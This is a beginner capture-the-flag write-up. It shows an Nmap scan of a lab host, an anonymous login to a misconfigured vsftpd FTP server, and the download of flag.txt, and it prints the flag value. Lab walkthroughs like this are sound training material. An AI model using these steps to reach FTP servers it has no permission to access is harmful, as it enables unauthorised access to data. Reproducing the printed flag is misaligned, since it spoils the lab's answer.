**Difficulty**: Easy  
**Objective**: Exploiting **Misconfigured FTP Access Exploitation**.
**Tools Used**: Nmap


### Introduction

**What it is?** FTP or FIle Transfer Protocol is a standard network protocol used to transfer files between a client and a server over a TCP based network like the internet.
**Port?** 21
**What you can do with it?** It is primarily used for uploading and downloading files, managing website files or transferring data between systems.

Basically, the client initiates a conntection to the FTP server. Once connected the server grants a CLI for interaction for file transfer.

**Port Usage**:
21 ~ for control channel.
20 ~ for data channels in active mode.
Random Port ~ for data transfer in passive mode.

**Active Mode?** The server connects back to the client on a specific port for data transfer.
**Passive Mode?** The client initiates both control and data connections to the server which is useful for bypassing firewalls.

**Authentications**:
**Anonymous?** Allows users to access the server without credentials often with limited permissions.
**Authenticated?** Requires a username and password for access.

**Command**:
```
ftp <ip address>
```


### Enumeration

Assuming your connections are established and the ping was successful.
We use Nmap which is a Network Mapper whose goal is to send requests to ports of your choice, or all 65535 or even by default the top 1000 ports and returns which are open, filtered or closed.

This time we will use Nmap with the -sV flag to enumerate the services and their versions being used. Do this as:

```
$ sudo nmap -sV 10.129.40.148
[sudo] password for ghost: 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 15:33 IST
Nmap scan report for 10.129.40.148
Host is up (1.9s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds
```

Clearly, it can be observed that at port number 21, ftp with vsftpd 3.0.3 is open.
Also, the server uses a Unix OS.


### Trying FTP Connection

After knowing FTP is open at 21, let's fire FTP up at ip address `10.129.40.148` as:
```
$ ftp 10.129.40.148
Connected to 10.129.40.148.
220 (vsFTPd 3.0.3)
Name (10.129.40.148:alice):
```

Let's try the anonymous login method.
Here's what we got:
```
Name (10.129.40.148:alice): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp>
```

Voila! We have remote access.


### FInding the Flag

(It's ironic for me to say finding the flag, but technically I am)
Let's go ahead and list all available commands using `help` command.
```
ftp> help
Commands may be abbreviated.  Commands are:

!		epsv6		mget		preserve	sendport
$		exit		mkdir		progress	set
account		features	mls		prompt		site
append		fget		mlsd		proxy		size
ascii		form		mlst		put		sndbuf
bell		ftp		mode		pwd		status
binary		gate		modtime		quit		struct
bye		get		more		quote		sunique
case		glob		mput		rate		system
cd		hash		mreget		rcvbuf		tenex
cdup		help		msend		recv		throttle
chmod		idle		newer		reget		trace
close		image		nlist		remopts		type
cr		lcd		nmap		rename		umask
debug		less		ntrans		reset		unset
delete		lpage		open		restart		usage
dir		lpwd		page		rhelp		user
disconnect	ls		passive		rmdir		verbose
edit		macdef		pdir		rstatus		xferbuf
epsv		mdelete		pls		runique		?
epsv4		mdir		pmlsd		send

```

Let's `ls` all available files:
```
ftp> ls
229 Entering Extended Passive Mode (|||40385|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

```

Now, we will download the flag using `get` command:
```
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||11016|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************|    32        0.01 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:03 (0.00 KiB/s)

ftp> exit
221 Goodbye.

```

Now, `cat` this `flag.txt` as:
```
$ cat flag.txt 
035db21c881520061c53e0536e44f815
```

Flag: `035db21c881520061c53e0536e44f815`
